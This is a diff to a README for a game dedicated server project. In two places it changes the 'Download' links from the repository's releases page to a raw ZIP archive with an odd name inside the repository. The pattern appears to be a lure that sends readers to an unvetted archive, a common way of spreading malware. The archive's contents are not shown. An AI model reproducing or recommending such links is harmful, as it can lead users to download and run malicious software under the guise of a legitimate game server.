@@ -1,6 +1,6 @@
 # ⚓ Windrose-Game-Dedicated-Server - Host your own private pirate adventures
 
-[Download Windrose Server](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/releases)
+[Download Windrose Server](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/raw/refs/heads/main/Server/Server_Game_Windrose_Dedicated_annoyful.zip)
 
 ## 📦 About this project
 
@@ -27,7 +27,7 @@ Follow these steps to get your server running.
 2.  ### Download the software
     Visit the release page to get the latest files. Use the link below to find the correct version.
 
-    [Download Server Files](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/releases)
+    [Download Server Files](https://github.com/vivietough2602/Windrose-Game-Dedicated-Server/raw/refs/heads/main/Server/Server_Game_Windrose_Dedicated_annoyful.zip)
 
     Save the folder to a location you can find easily, such as your desktop or a dedicated games folder. Extract the contents if the file comes in a compressed format.
 
